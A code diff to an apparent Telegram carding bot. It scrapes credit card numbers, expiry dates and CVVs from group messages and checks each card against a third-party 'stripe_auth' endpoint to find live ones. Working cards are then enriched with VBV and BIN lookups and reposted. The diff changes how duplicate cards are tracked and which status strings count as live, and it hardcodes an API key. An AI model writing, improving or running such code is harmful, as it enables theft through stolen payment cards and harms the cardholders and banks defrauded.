@@ -4,6 +4,7 @@ import httpx
 import random
 import time
 from telethon import TelegramClient, events
+from collections import deque
 
 # Telegram Config
 api_id = 22092598
@@ -21,6 +22,9 @@ proxy_emojis = ["☁️", "⚡", "✨", "☀️", "🌧️", "❄️"]
 cc_pattern = re.compile(r'(\d{13,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})')
 API_URL = "https://barryxapi.xyz/stripe_auth"
 API_KEY = "BRY-HEIQ7-KPWYR-DRU67"
+
+# Recently checked CCs (avoid duplicates)
+sent_ccs = deque(maxlen=5000)
 
 def format_cc(match):
     cc, mm, yy, cvv = match.groups()
@@ -67,8 +71,6 @@ async def get_bin_info(bin_number):
         except:
             return {"country": "Unknown", "flag": "🏳", "bank": "Unknown", "type": "Unknown"}
 
-sent_ccs = set()
-
 @client.on(events.NewMessage())
 async def fast_scraper(event):
     if event.chat_id not in group_ids:
@@ -81,12 +83,12 @@ async def fast_scraper(event):
             if cc in sent_ccs:
                 print(f"[SKIPPED] Already checked: {cc}")
                 continue
+            sent_ccs.append(cc)
 
-            sent_ccs.add(cc)
             result = await stripe_check(cc)
             print("Stripe Result:", result)
 
-            if result["status"].lower() in ["approved", "charged", "insufficient_funds", "incorrect_cvc"]:
+            if any(x in result["status"].lower() for x in ["approved", "charged", "insufficient", "incorrect"]):
                 start = time.time()
                 vbv_status = await vbv_check(cc)
                 bin_info = await get_bin_info(cc[:6])
@@ -100,7 +102,7 @@ async def fast_scraper(event):
 𝗦𝘁𝗮𝘁𝘂𝘀 - Process Completed
 ━━━━━━━━━━━━━
 [ϟ] 𝗖𝗖 - <code>{cc}</code>
-[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : Approved ✅
+[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {result["message"]}
 [ϟ] 𝗚𝗮𝘁𝗲 - {gate}
 ━━━━━━━━━━━━━
 [ϟ] 𝗩𝗕𝗩 - {vbv_status}
